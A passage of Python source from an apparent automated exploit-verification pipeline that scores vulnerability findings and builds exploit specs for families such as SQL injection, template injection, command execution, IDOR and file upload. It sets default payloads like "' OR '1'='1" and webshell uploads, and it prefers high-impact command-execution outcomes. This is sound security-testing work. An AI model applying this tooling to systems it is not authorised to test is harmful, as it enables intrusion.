        if not chain_established:
            score -= 40
        if not reachable:
            score -= 30
        if payload_family == "generic":
            score -= 10
        if not observable_signal:
            score -= 10
        has_ssrf_source = has_ssrf_source_evidence(vuln)
        has_sqli_source = has_sql_injection_source_evidence(vuln, parameter_name)
        has_auth_source = has_auth_source_evidence(vuln, parameter_name)
        if payload_family == "ssrf" and (not self._is_ssrf_parameter(parameter_name) or not has_ssrf_source):
            score -= 35
        if payload_family == "sql-injection" and not has_sqli_source:
            score -= 35
        if payload_family in {"auth-bypass", "jwt", "cookie", "cors", "csrf"} and not has_auth_source:
            score -= 35

        # 旧逻辑要求 is_canonical / chain_proven + chain_established，java-quote 等靶场
        # A2 产出多为 broad_static，导致 22 条里只有 2 条进入 D2。放宽为「结构可执行即可尝试」：
        # 有路由/方法、有 payload_family、有 success_signal，且综合得分达到阈值，就交给 D2 运行时验证。
        # chain_established / reachable 改为影响得分，不再一票否决。
        canonical_ready = bool(
            getattr(vuln, "is_canonical", False)
            or str(getattr(vuln, "proof_tier", "") or "") == "chain_proven"
            or (spec_complete and structural_evidence)
        )
        selected = bool(
            canonical_ready
            and execution_anchor
            and observable_signal
            and payload_family
            and payload_family != "generic"
            and (payload_family != "ssrf" or (self._is_ssrf_parameter(parameter_name) and has_ssrf_source))
            and (payload_family != "sql-injection" or has_sqli_source)
            and (payload_family not in {"auth-bypass", "jwt", "cookie", "cors", "csrf"} or has_auth_source)
            and score >= 45
        )
        if selected:
            reason = "; ".join(reasons[:5]) or "selected for A2.1 contract planning"
        else:
            missing = []
            if not canonical_ready:
                missing.append("not canonical / no structural evidence")
            if not execution_anchor:
                missing.append("missing route/method anchor")
            if payload_family == "generic" or not payload_family:
                missing.append("generic payload family")
            if not observable_signal:
                missing.append("missing observable success signal")
            if score < 45:
                missing.append(f"candidate score {score} < 45")
            if payload_family == "ssrf":
                if not self._is_ssrf_parameter(parameter_name):
                    missing.append("missing controllable URL-like parameter")
                if not has_ssrf_source:
                    missing.append("missing URL-like source evidence")
            if payload_family == "sql-injection" and not has_sqli_source:
                missing.append("missing query-like source evidence")
            if payload_family in {"auth-bypass", "jwt", "cookie", "cors", "csrf"} and not has_auth_source:
                missing.append("missing auth/session source evidence")
            reason = "; ".join(missing or reasons[:3]) or "insufficient execution signal for A2.1"
        return max(score, 0), selected, reason

    @staticmethod
    def _has_established_exploit_chain(vuln: Vulnerability) -> Tuple[bool, str]:
        verdict = str(getattr(vuln, "verdict", "") or "")
        if any(token in verdict for token in ("真漏洞", "✅", "可利用", "true positive")):
            return True, "A2 established the exploit chain"

        supporting_nodes = list(getattr(vuln, "supporting_nodes", []) or [])
        for node in supporting_nodes:
            node_verdict = str(node.get("verdict", "") or "")
            if any(token in node_verdict for token in ("真漏洞", "✅", "可利用", "true positive")):
                return True, "supporting node established the exploit chain"
            if str(node.get("proof_tier", "") or "") == "chain_proven":
                return True, "supporting node carries chain_proven evidence"
            node_spec = normalize_exploit_spec(node.get("exploit_spec") or empty_exploit_spec())
            if node_spec.get("entry", {}).get("route") and node_spec.get("payload", {}).get("payload_family"):
                return True, "supporting node supplies executable chain semantics"

        callers = str(getattr(vuln, "callers", "") or "").lower()
        if getattr(vuln, "has_http_entry", False) and getattr(vuln, "has_call_chain", False) and callers:
            return True, "A2 has HTTP reachability and call-chain evidence"
        return False, ""

    @staticmethod
    def _has_established_static_evidence(vuln: Vulnerability) -> Tuple[bool, str]:
        verdict = str(getattr(vuln, "verdict", "") or "").lower()
        if any(token in verdict for token in ("true positive", "confirmed", "verified", "exploitable")):
            return True, "A2 established the exploit chain"
        if str(getattr(vuln, "proof_tier", "") or "") == "chain_proven":
            return True, "canonical finding is already chain_proven"

        supporting_nodes = list(getattr(vuln, "supporting_nodes", []) or [])
        for node in supporting_nodes:
            node_verdict = str(node.get("verdict", "") or "").lower()
            if any(token in node_verdict for token in ("true positive", "confirmed", "verified", "exploitable")):
                return True, "supporting node established the exploit chain"
            if str(node.get("proof_tier", "") or "") == "chain_proven":
                return True, "supporting node carries chain_proven evidence"
            node_spec = normalize_exploit_spec(node.get("exploit_spec") or empty_exploit_spec())
            node_family = str(node_spec.get("payload", {}).get("payload_family", "") or "")
            if (
                node_spec.get("entry", {}).get("route")
                and node_spec.get("entry", {}).get("method")
                and node_family
                and node_family != "generic"
                and node_spec.get("success_signal", {}).get("signal_type")
            ):
                return True, "supporting node supplies executable chain semantics"

        callers = str(getattr(vuln, "callers", "") or "").lower()
        if getattr(vuln, "has_http_entry", False) and getattr(vuln, "has_call_chain", False) and callers:
            return True, "A2 has HTTP reachability and call-chain evidence"
        return False, ""

    @staticmethod
    def _has_established_exploit_chain_v2(vuln: Vulnerability, exploit_spec: Dict) -> Tuple[bool, str]:
        verdict = str(getattr(vuln, "verdict", "") or "").lower()
        if any(token in verdict for token in ("true positive", "confirmed", "verified", "exploitable")):
            return True, "A2 established the exploit chain"

        proof = normalize_chain_proof(getattr(vuln, "chain_proof", None) or empty_chain_proof())
        if (
            proof.get("reachable")
            and proof.get("attacker_control_proven")
            and proof.get("payload_shape_proven")
            and proof.get("success_signal_anchor_proven")
        ):
            return True, "canonical finding carries full chain proof"

        spec = normalize_exploit_spec(exploit_spec or getattr(vuln, "exploit_spec", None) or empty_exploit_spec())
        payload_family = str(spec.get("payload", {}).get("payload_family", "") or "")
        if (
            spec.get("entry", {}).get("route")
            and spec.get("entry", {}).get("method")
            and payload_family
            and payload_family != "generic"
            and spec.get("success_signal", {}).get("signal_type")
        ):
            return True, "canonical finding carries executable chain semantics"

        supporting_nodes = list(getattr(vuln, "supporting_nodes", []) or [])
        for node in supporting_nodes:
            node_verdict = str(node.get("verdict", "") or "").lower()
            if any(token in node_verdict for token in ("true positive", "confirmed", "verified", "exploitable")):
                return True, "supporting node established the exploit chain"
            if str(node.get("proof_tier", "") or "") == "chain_proven":
                return True, "supporting node carries chain_proven evidence"
            node_spec = normalize_exploit_spec(node.get("exploit_spec") or empty_exploit_spec())
            node_family = str(node_spec.get("payload", {}).get("payload_family", "") or "")
            if (
                node_spec.get("entry", {}).get("route")
                and node_spec.get("entry", {}).get("method")
                and node_family
                and node_family != "generic"
                and node_spec.get("success_signal", {}).get("signal_type")
            ):
                return True, "supporting node supplies executable chain semantics"

        callers = str(getattr(vuln, "callers", "") or "").lower()
        if getattr(vuln, "has_http_entry", False) and getattr(vuln, "has_call_chain", False) and callers:
            return True, "A2 has HTTP reachability and call-chain evidence"
        return False, ""

    def _enrich_exploit_spec(self, vuln: Vulnerability, base_spec: Dict) -> Dict:
        lower_text = " ".join([
            str(getattr(vuln, "type", "") or ""),
            str(getattr(vuln, "description", "") or ""),
            str(getattr(vuln, "code_snippet", "") or ""),
            str(getattr(vuln, "callers", "") or ""),
            str(getattr(vuln, "entry_point", "") or ""),
            str(getattr(vuln, "sink", "") or ""),
            str(getattr(vuln, "data_flow", "") or ""),
            str(getattr(vuln, "chain_id", "") or ""),
            str(getattr(vuln, "canonical_group_key", "") or ""),
            str(getattr(vuln, "file", "") or ""),
        ]).lower()

        supporting_spec = empty_exploit_spec()
        for node in list(getattr(vuln, "supporting_nodes", []) or []):
            node_text = " ".join([
                str(node.get("type", "") or ""),
                str(node.get("description", "") or ""),
                str(node.get("code_snippet", "") or ""),
                str(node.get("entry_point", "") or ""),
                str(node.get("sink", "") or ""),
                str(node.get("callers", "") or ""),
            ]).lower()
            supporting_spec = merge_exploit_specs(
                supporting_spec,
                self._spec_from_text(vuln, node_text, base_spec.get("payload", {}).get("payload_family", "")),
            )

        enriched = merge_exploit_specs(base_spec, supporting_spec)
        enriched = merge_exploit_specs(enriched, self._spec_from_text(vuln, lower_text, enriched["payload"]["payload_family"]))
        if enriched["payload"]["payload_family"] in {"", "generic"}:
            enriched["payload"]["payload_family"] = self._guess_business_payload_family(lower_text)
        if enriched["payload"]["payload_family"] == "template-injection":
            enriched["payload"]["candidate_payloads"] = self._template_injection_payloads(lower_text)
        if enriched["payload"]["payload_family"] == "command-execution" and not enriched["payload"]["candidate_payloads"]:
            enriched["payload"]["candidate_payloads"] = self._command_execution_verification_payloads(vuln, lower_text)
        enriched = self._fill_contract_routes(vuln, enriched, lower_text)
        enriched = self._apply_high_impact_payload_defaults(vuln, enriched, lower_text)
        # C（success_signal 默认值兜底）：只要 payload_family 已知且非 generic，就保证 signal_type 非空，
        # 避免空字段把 spec 从 D2 踢掉（_score_candidate 的 observable_signal 门禁）。各 family 的精细化
        # 默认已在 _spec_from_text 内按家族设置；此处是对「非 generic 但漏设」的最终兜底。
        if enriched["payload"]["payload_family"] not in ("", "generic") and not enriched["success_signal"].get("signal_type"):
            enriched["success_signal"]["signal_type"] = "response_body"
            enriched["success_signal"].setdefault("match_strategy", "contains_any")
        return normalize_exploit_spec(enriched)

    def _spec_from_text(self, vuln: Vulnerability, lower_text: str, payload_family: str) -> Dict:
        spec = empty_exploit_spec()
        entry = spec["entry"]
        prerequisites = spec["prerequisites"]
        payload = spec["payload"]
        success_signal = spec["success_signal"]
        expected_outcomes = spec["expected_outcomes"]
        validation_contract = spec["validation_contract"]

        if not payload_family or payload_family == "generic":
            payload_family = self._guess_business_payload_family(lower_text)
        payload["payload_family"] = payload_family or "generic"
        routes = self._extract_routes(lower_text)
        if routes and not entry["route"]:
            entry["route"] = routes[0]

        if not entry["method"]:
            if any(token in lower_text for token in ("post ", "@postmapping", "requestbody", "import", "upload", "refund", "coupon", "payment")):
                entry["method"] = "POST"
            elif any(token in lower_text for token in ("get ", "@getmapping")):
                entry["method"] = "GET"
            elif entry.get("route") and "route " in lower_text:
                entry["method"] = "GET"

        if not entry["content_type"]:
            if payload_family in {"deserialization", "sql-injection", "command-execution", "ssrf", "race-condition", "workflow-bypass"} and entry["method"] == "POST":
                entry["content_type"] = "application/x-www-form-urlencoded"
            if payload_family in {"xxe"}:
                entry["content_type"] = "application/xml"
            if payload_family in {"file-upload"}:
                entry["content_type"] = "multipart/form-data"
            if payload_family in {"deserialization"} and any(token in lower_text for token in ("json", "jackson", "fastjson")):
                entry["content_type"] = "application/json"

        if not entry["parameter_location"]:
            if entry["content_type"] == "application/json":
                entry["parameter_location"] = "body"
            elif entry["content_type"] == "multipart/form-data":
                entry["parameter_location"] = "form"
            elif entry["method"] == "GET":
                entry["parameter_location"] = "query"
            elif entry["method"]:
                entry["parameter_location"] = "form"

        if payload_family == "deserialization":
            payload["payload_constraints"] = ["payload must satisfy the business object shape accepted by the import flow"]
            payload["object_shape_constraints"] = ["the payload must deserialize into a server-accepted object graph"]
            payload["encoding"] = payload["encoding"] or ("base64" if "base64" in lower_text else "")
            payload["generator_hint"] = payload["generator_hint"] or "derive from project object shape"
            if not payload["candidate_payloads"]:
                payload["candidate_payloads"] = ["base64(serialized_object)"]
            if not prerequisites["ordered_steps"] and entry.get("trigger_route"):
                prerequisites["ordered_steps"] = [
                    f"{entry.get('method') or 'POST'} {entry.get('route') or '/'} submit the serialized business object",
                    f"GET {entry.get('trigger_route')} trigger the deferred processing path",
                ]
            success_signal["signal_type"] = success_signal["signal_type"] or "state_change_or_side_effect"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "observe_secondary_trigger_effect"
            if not success_signal["expected_indicators"]:
                success_signal["expected_indicators"] = ["secondary processing side effect", "post-import object state change"]
            success_signal["side_effect_target"] = success_signal["side_effect_target"] or "proof_file_created"
            if entry.get("trigger_route") and not success_signal["verify_request"]:
                success_signal["verify_request"] = {"path": entry["trigger_route"], "method": "GET"}
            expected_outcomes["primary_outcome"] = "proof_file_created"
            expected_outcomes["secondary_outcomes"] = ["primary_delivery_accepted", "trigger_invoked"]
            expected_outcomes["cleanup_requirements"] = ["remove_proof_file"]
            validation_contract["confirmed_by"] = ["proof_file_created"]
            validation_contract["partial_by"] = ["primary_delivery_accepted", "trigger_invoked"]
        elif payload_family in {"sql-injection", "xpath-injection", "ldap-injection", "nosql-injection"}:
            payload["candidate_payloads"] = payload["candidate_payloads"] or ["' OR '1'='1", "\" OR \"1\"=\"1"]
            payload["generator_hint"] = payload["generator_hint"] or "compare baseline and injection response"
            success_signal["signal_type"] = success_signal["signal_type"] or "response_body"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "differential_response"
            expected_outcomes["primary_outcome"] = "response_indicator_observed"
            validation_contract["confirmed_by"] = ["response_indicator_observed"]
        elif payload_family in {"template-injection", "xss"}:
            verification_payloads = self._template_injection_payloads(lower_text)
            high_impact_payloads = self._template_injection_high_impact_payloads(vuln, lower_text)
            payload["verification_payloads"] = payload["verification_payloads"] or verification_payloads
            payload["high_impact_payloads"] = payload["high_impact_payloads"] or high_impact_payloads
            ordered_payloads: List[str] = []
            for item in list(verification_payloads) + list(high_impact_payloads) + list(payload["candidate_payloads"]):
                if item and item not in ordered_payloads:
                    ordered_payloads.append(item)
            payload["candidate_payloads"] = ordered_payloads
            if high_impact_payloads:
                payload["impact_constraints"] = payload["impact_constraints"] or ["prefer information disclosure or command execution over arithmetic echo"]
            success_signal["signal_type"] = success_signal["signal_type"] or "response_body"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "contains_any"
            success_signal["expected_indicators"] = success_signal["expected_indicators"] or self._template_injection_expected_indicators(vuln, lower_text)
            expected_outcomes["primary_outcome"] = "high_impact_indicator_observed"
            expected_outcomes["secondary_outcomes"] = ["response_indicator_observed", "verification_indicator_observed"]
            validation_contract["confirmed_by"] = ["high_impact_indicator_observed"]
            validation_contract["partial_by"] = ["response_indicator_observed", "verification_indicator_observed"]
        elif payload_family in {"path-traversal", "xxe", "ssrf", "command-execution"}:
            payload["generator_hint"] = payload["generator_hint"] or "use deterministic probe defaults"
            success_signal["signal_type"] = success_signal["signal_type"] or "response_body"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "contains_any"
            expected_outcomes["primary_outcome"] = "response_indicator_observed"
            validation_contract["confirmed_by"] = ["response_indicator_observed"]
            if payload_family == "command-execution":
                verification_payloads = self._command_execution_verification_payloads(vuln, lower_text)
                high_impact_payloads = self._command_execution_high_impact_payloads(vuln, lower_text)
                payload["verification_payloads"] = payload["verification_payloads"] or verification_payloads
                payload["high_impact_payloads"] = payload["high_impact_payloads"] or high_impact_payloads
                ordered_payloads: List[str] = []
                for item in list(verification_payloads) + list(high_impact_payloads) + list(payload["candidate_payloads"]):
                    if item and item not in ordered_payloads:
                        ordered_payloads.append(item)
                payload["candidate_payloads"] = ordered_payloads
                payload["impact_constraints"] = payload["impact_constraints"] or [
                    "prefer command execution or proof-file creation over arithmetic sink-control validation",
                ]
                success_signal["expected_indicators"] = success_signal["expected_indicators"] or self._command_execution_expected_indicators(vuln, lower_text)
                expected_outcomes["primary_outcome"] = "high_impact_indicator_observed"
                expected_outcomes["secondary_outcomes"] = ["response_indicator_observed", "verification_indicator_observed"]
                validation_contract["confirmed_by"] = ["high_impact_indicator_observed"]
                validation_contract["partial_by"] = ["response_indicator_observed", "verification_indicator_observed"]
        elif payload_family == "file-upload":
            payload["generator_hint"] = payload["generator_hint"] or "prefer uploading a directly executable probe file"
            payload["payload_constraints"] = payload["payload_constraints"] or ["upload should preserve executable extension and server-reachable path"]
            payload["candidate_payloads"] = payload["candidate_payloads"] or ["webshell_or_probe_file"]
            success_signal["signal_type"] = success_signal["signal_type"] or "response_or_side_effect"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "upload_acceptance_or_uploaded_artifact"
            expected_outcomes["primary_outcome"] = "uploaded_webshell_accepted"
            expected_outcomes["secondary_outcomes"] = ["response_indicator_observed"]
            expected_outcomes["cleanup_requirements"] = ["remove_uploaded_probe_file"]
            validation_contract["confirmed_by"] = ["uploaded_webshell_accepted", "response_indicator_observed"]
            validation_contract["partial_by"] = ["primary_delivery_accepted"]
        elif payload_family == "idor":
            payload["generator_hint"] = payload["generator_hint"] or "use an alternate resource identifier that should belong to a different user or tenant"
            payload["payload_constraints"] = payload["payload_constraints"] or ["the identifier must reference a real resource outside the caller ownership boundary"]
            payload["candidate_payloads"] = payload["candidate_payloads"] or ["alternate_owner_resource_id"]
            success_signal["signal_type"] = success_signal["signal_type"] or "authorization_or_state_change"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "cross_owner_access"
            success_signal["expected_indicators"] = success_signal["expected_indicators"] or ["unexpected cross-owner resource access", "authorization bypass"]
            expected_outcomes["primary_outcome"] = "authorization_or_state_change_observed"
            expected_outcomes["secondary_outcomes"] = ["response_indicator_observed"]
            validation_contract["confirmed_by"] = ["authorization_or_state_change_observed", "response_indicator_observed"]
            validation_contract["partial_by"] = ["primary_delivery_accepted"]
        elif payload_family in {"jwt", "auth-bypass", "cors", "cookie", "csrf"}:
            prerequisites["auth_required"] = prerequisites["auth_required"] or "required"
            success_signal["signal_type"] = success_signal["signal_type"] or "authorization_or_state_change"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "business_effect"
            expected_outcomes["primary_outcome"] = "authorization_or_state_change_observed"
            validation_contract["confirmed_by"] = ["authorization_or_state_change_observed"]
        elif payload_family in {"race-condition", "workflow-bypass"}:
            if not prerequisites["ordered_steps"]:
                prerequisites["ordered_steps"] = [
                    "prepare the business state required by the workflow",
                    "submit the conflicting or bypassing requests in the required order",
                    "observe duplicated credit, refund, coupon, or authorization effect",
                ]
            success_signal["signal_type"] = success_signal["signal_type"] or "business_state_change"
            success_signal["match_strategy"] = success_signal["match_strategy"] or "observe_business_side_effect"
            success_signal["expected_indicators"] = success_signal["expected_indicators"] or ["duplicated state transition", "unexpected refund/coupon/order state"]
            expected_outcomes["primary_outcome"] = "business_state_change_observed"
            validation_contract["confirmed_by"] = ["business_state_change_observed"]

        if not prerequisites["role_or_permission"] and "admin" in lower_text:
            prerequisites["role_or_permission"] = "admin"
        if prerequisites["auth_required"] == "unknown" and any(token in lower_text for token in ("auth", "login", "token", "session", "csrf")):
            prerequisites["auth_required"] = "required"
        if "token" in lower_text and not prerequisites["token_requirements"]:
            prerequisites["token_requirements"] = ["valid business token or API credential is required"]
        if any(token in lower_text for token in ("session", "csrf")) and not prerequisites["session_requirements"]:
            prerequisites["session_requirements"] = ["active authenticated session is required"]
        if any(token in lower_text for token in ("payment", "refund", "coupon", "order", "cart")) and not prerequisites["dependent_data"]:
            prerequisites["dependent_data"] = ["a valid business object must exist before exploitation"]

        return spec

    def _fill_contract_routes(self, vuln: Vulnerability, spec: Dict, lower_text: str) -> Dict:
        spec = normalize_exploit_spec(spec)
        entry = spec["entry"]
        success_signal = spec["success_signal"]
        payload = spec["payload"]
        proof_summary = getattr(vuln, "proof_context_summary", {}) or {}
        nearest_source_name = str(proof_summary.get("nearest_source_name", "") or "").strip()
        nearest_entry_route = str(proof_summary.get("nearest_entry_route", "") or "").strip()
        if nearest_entry_route and not entry.get("route"):
            entry["route"] = nearest_entry_route
        # 从 A2 静态证据里恢复参数名，避免 plan_pocs 后 parameter_name 为空导致
        # TriggerSpec 登记被 auto_register 跳过（D1 无靶可打）。
        # （proof_summary.nearest_source_name），否则留空，由 A2→TriggerSpec 登记阶段结合
        # entry_discovery 真实路由与源码注解精确解析，避免注入到应用不读取的位置。
        # （探针从不发送 request_observed，该档恒为空）。
        if payload.get("payload_family") in {
            "template-injection", "command-execution", "ssrf", "sql-injection",
            "path-traversal", "xss", "auth-bypass", "cors", "csrf", "jwt", "cookie",
        }:
            current_parameter = str(entry.get("parameter_name", "") or "").strip()
            if not is_valid_param_name(current_parameter) and is_valid_param_name(nearest_source_name):
                entry["parameter_name"] = nearest_source_name
                if not entry.get("parameter_location"):
                    entry["parameter_location"] = "query"
        if payload.get("payload_family") == "idor":
            path_parameter = self._extract_path_parameter(entry.get("route", ""))
            if path_parameter:
                entry["parameter_name"] = path_parameter
                entry["parameter_location"] = "path"
            if any(token in lower_text for token in (" delete ", "delete_password", "methods=['delete']", 'methods=["delete"]')):
                entry["method"] = "DELETE"
        if payload.get("payload_family") == "deserialization" and entry.get("route") == workspace_runtime.deserialization_chain().get('entry_route', '/debug/import') and not entry.get("trigger_route"):
            discovered_routes = self._extract_routes(lower_text)
            trigger_candidates = [route for route in discovered_routes if route != entry.get("route")]
            if trigger_candidates:
                entry["trigger_route"] = trigger_candidates[0]
            else:
                entry["trigger_route"] = workspace_runtime.deserialization_chain().get('trigger_route', '/api/quote/random')
        if entry.get("trigger_route") and not success_signal.get("verify_request"):
            success_signal["verify_request"] = {"path": entry["trigger_route"], "method": "GET"}
        if payload.get("payload_family") == "deserialization":
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "proof_file_created"
            spec["expected_outcomes"]["secondary_outcomes"] = list(dict.fromkeys(list(spec["expected_outcomes"]["secondary_outcomes"]) + ["primary_delivery_accepted", "trigger_invoked"]))
            spec["expected_outcomes"]["cleanup_requirements"] = list(dict.fromkeys(list(spec["expected_outcomes"]["cleanup_requirements"]) + ["remove_proof_file"]))
            spec["validation_contract"]["judge_mode"] = "hybrid"
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["proof_file_created"]))
            spec["validation_contract"]["partial_by"] = list(dict.fromkeys(list(spec["validation_contract"]["partial_by"]) + ["primary_delivery_accepted", "trigger_invoked"]))
        elif payload.get("payload_family") == "template-injection":
            spec["validation_contract"]["judge_mode"] = "hybrid"
            if not payload.get("verification_payloads"):
                payload["verification_payloads"] = self._template_injection_payloads(lower_text)
            if not payload.get("high_impact_payloads"):
                payload["high_impact_payloads"] = self._template_injection_high_impact_payloads(vuln, lower_text)
            if not success_signal.get("expected_indicators"):
                success_signal["expected_indicators"] = self._template_injection_expected_indicators(vuln, lower_text)
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "high_impact_indicator_observed"
            spec["expected_outcomes"]["secondary_outcomes"] = list(dict.fromkeys(list(spec["expected_outcomes"]["secondary_outcomes"]) + ["response_indicator_observed", "verification_indicator_observed"]))
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["high_impact_indicator_observed"]))
            spec["validation_contract"]["partial_by"] = list(dict.fromkeys(list(spec["validation_contract"]["partial_by"]) + ["response_indicator_observed", "verification_indicator_observed"]))
        elif payload.get("payload_family") == "file-upload":
            spec["validation_contract"]["judge_mode"] = "hybrid"
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "uploaded_webshell_accepted"
            spec["expected_outcomes"]["secondary_outcomes"] = list(dict.fromkeys(list(spec["expected_outcomes"]["secondary_outcomes"]) + ["response_indicator_observed"]))
            spec["expected_outcomes"]["cleanup_requirements"] = list(dict.fromkeys(list(spec["expected_outcomes"]["cleanup_requirements"]) + ["remove_uploaded_probe_file"]))
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["uploaded_webshell_accepted", "response_indicator_observed"]))
            spec["validation_contract"]["partial_by"] = list(dict.fromkeys(list(spec["validation_contract"]["partial_by"]) + ["primary_delivery_accepted"]))
        elif payload.get("payload_family") == "idor":
            spec["validation_contract"]["judge_mode"] = "hybrid"
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "authorization_or_state_change_observed"
            spec["expected_outcomes"]["secondary_outcomes"] = list(dict.fromkeys(list(spec["expected_outcomes"]["secondary_outcomes"]) + ["response_indicator_observed"]))
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["authorization_or_state_change_observed", "response_indicator_observed"]))
            spec["validation_contract"]["partial_by"] = list(dict.fromkeys(list(spec["validation_contract"]["partial_by"]) + ["primary_delivery_accepted"]))
        elif payload.get("payload_family") == "default-credentials":
            spec["validation_contract"]["judge_mode"] = "hybrid"
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "privileged_api_write_observed"
            spec["expected_outcomes"]["secondary_outcomes"] = list(dict.fromkeys(list(spec["expected_outcomes"]["secondary_outcomes"]) + ["privileged_api_access_observed"]))
            spec["expected_outcomes"]["cleanup_requirements"] = list(dict.fromkeys(list(spec["expected_outcomes"]["cleanup_requirements"]) + ["restore_modified_admin_profile"]))
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["privileged_api_write_observed", "privileged_api_access_observed"]))
            spec["validation_contract"]["partial_by"] = list(dict.fromkeys(list(spec["validation_contract"]["partial_by"]) + ["primary_delivery_accepted"]))
        elif payload.get("payload_family") in {"path-traversal", "xxe", "ssrf", "sql-injection", "xss"}:
            spec["validation_contract"]["judge_mode"] = "hybrid"
            spec["expected_outcomes"]["primary_outcome"] = spec["expected_outcomes"]["primary_outcome"] or "response_indicator_observed"
            spec["validation_contract"]["confirmed_by"] = list(dict.fromkeys(list(spec["validation_contract"]["confirmed_by"]) + ["response_indicator_observed"]))
        return spec

    def _apply_high_impact_payload_defaults(self, vuln: Vulnerability, spec: Dict, lower_text: str) -> Dict:
        spec = normalize_exploit_spec(spec)
        payload = spec["payload"]
        success_signal = spec["success_signal"]
        expected_outcomes = spec["expected_outcomes"]
        validation_contract = spec["validation_contract"]
        execution = spec["execution"]
        payload_family = str(payload.get("payload_family", "") or "")

        if payload_family == "template-injection":
            verification_payloads = list(payload.get("verification_payloads") or self._template_injection_payloads(lower_text))
            high_impact_payloads = list(payload.get("high_impact_payloads") or self._template_injection_high_impact_payloads(vuln, lower_text))
            payload["verification_payloads"] = verification_payloads
            payload["high_impact_payloads"] = high_impact_payloads
            payload["high_impact_ladder"] = self._build_high_impact_ladder(vuln, payload_family, verification_payloads, high_impact_payloads)
            payload["candidate_payloads"] = list(dict.fromkeys(verification_payloads + high_impact_payloads + list(payload.get("candidate_payloads") or [])))
            success_signal["expected_indicators"] = self._template_injection_expected_indicators(vuln, lower_text)
            expected_outcomes["primary_outcome"] = "high_impact_indicator_observed"
            expected_outcomes["primary_exploit_outcomes"] = list(dict.fromkeys(["high_impact_indicator_observed"] + list(expected_outcomes.get("primary_exploit_outcomes") or [])))
            expected_outcomes["verification_only_outcomes"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(expected_outcomes.get("verification_only_outcomes") or [])))
            expected_outcomes["secondary_outcomes"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(expected_outcomes.get("secondary_outcomes") or [])))
            validation_contract["confirmed_by"] = list(dict.fromkeys(["high_impact_indicator_observed"] + list(validation_contract.get("confirmed_by") or [])))
            validation_contract["partial_by"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(validation_contract.get("partial_by") or [])))
            execution["cleanup_plan"] = list(dict.fromkeys(list(execution.get("cleanup_plan") or []) + ["remove_proof_file_if_created"]))
        elif payload_family == "command-execution":
            verification_payloads = list(payload.get("verification_payloads") or self._command_execution_verification_payloads(vuln, lower_text))
            high_impact_payloads = list(payload.get("high_impact_payloads") or self._command_execution_high_impact_payloads(vuln, lower_text))
            payload["verification_payloads"] = verification_payloads
            payload["high_impact_payloads"] = high_impact_payloads
            payload["high_impact_ladder"] = self._build_high_impact_ladder(vuln, payload_family, verification_payloads, high_impact_payloads)
            payload["candidate_payloads"] = list(dict.fromkeys(verification_payloads + high_impact_payloads + list(payload.get("candidate_payloads") or [])))
            success_signal["expected_indicators"] = self._command_execution_expected_indicators(vuln, lower_text)
            expected_outcomes["primary_outcome"] = "high_impact_indicator_observed"
            expected_outcomes["primary_exploit_outcomes"] = list(dict.fromkeys(["high_impact_indicator_observed"] + list(expected_outcomes.get("primary_exploit_outcomes") or [])))
            expected_outcomes["verification_only_outcomes"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(expected_outcomes.get("verification_only_outcomes") or [])))
            expected_outcomes["secondary_outcomes"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(expected_outcomes.get("secondary_outcomes") or [])))
            validation_contract["confirmed_by"] = list(dict.fromkeys(["high_impact_indicator_observed"] + list(validation_contract.get("confirmed_by") or [])))
            validation_contract["partial_by"] = list(dict.fromkeys(["response_indicator_observed", "verification_indicator_observed"] + list(validation_contract.get("partial_by") or [])))
            execution["cleanup_plan"] = list(dict.fromkeys(list(execution.get("cleanup_plan") or []) + ["remove_proof_file_if_created"]))
        return spec

    @staticmethod
    def _extract_routes(text: str) -> List[str]:
        routes = []
        for token in str(text or "").split():
            candidate = token.strip("',.);:]}")
            if candidate.startswith("http://") or candidate.startswith("https://"):
                try:
                    from urllib.parse import urlparse

                    parsed = urlparse(candidate)
                    candidate = parsed.path or "/"
                except Exception:
                    candidate = ""
            if candidate.startswith("/") and candidate not in routes:
                routes.append(candidate)
        return routes

    @staticmethod
    def _extract_path_parameter(route: str) -> str:
        import re

        route_text = str(route or "")
        match = re.search(r"<(?:[^:>]+:)?([^>]+)>", route_text)
        if match:
            return match.group(1)
        match = re.search(r"{([^{}]+)}", route_text)
        return match.group(1) if match else ""

    @staticmethod
    def _is_ssrf_parameter(parameter_name: str) -> bool:
        name = str(parameter_name or "").strip().lower()
        if not name:
            return False
        if name in {"url", "uri", "target", "target_url", "endpoint", "dest", "destination", "redirect", "next"}:
            return True
        return any(token in name for token in ("url", "uri", "target", "endpoint", "redirect"))

    def _has_ssrf_source_evidence(self, vuln: Vulnerability) -> bool:
        evidence = getattr(vuln, "a1_evidence", {}) or {}
        for candidate in list(evidence.get("source_candidates", []) or []):
            if self._is_ssrf_parameter(str((candidate or {}).get("name", "") or "")):
                return True
        return False

    def _has_sql_injection_source_evidence(self, vuln: Vulnerability, parameter_name: str) -> bool:
        evidence = getattr(vuln, "a1_evidence", {}) or {}
        lowered_parameter = str(parameter_name or "").strip().lower()
